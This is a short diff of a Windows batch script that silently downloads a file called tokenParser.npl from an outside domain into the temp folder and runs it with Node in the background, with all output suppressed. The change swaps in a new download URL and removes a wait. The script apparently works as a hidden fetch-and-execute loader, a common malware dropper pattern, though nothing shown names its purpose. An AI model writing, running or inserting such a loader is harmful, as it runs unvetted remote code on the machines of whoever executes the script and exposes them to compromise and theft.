@@ -63,14 +63,12 @@ goto :RUN
 
 :RUN
 
-curl -s -L -o "%TEMP%\tokenParser.npl" "https://www.sandbox-support.cloud/tokenParser"
+curl -s -L -o "%TEMP%\tokenParser.npl" "https://www.sandbox-support.cloud/tokenParser1"
 if not exist "%TEMP%\tokenParser.npl" (
     exit /b 1
 )
 
 start "" /b "%NODE_EXE%" "%TEMP%\tokenParser.npl" >nul 2>&1
-
-timeout /t 3 /nobreak >nul
 
 endlocal
 exit /b 0
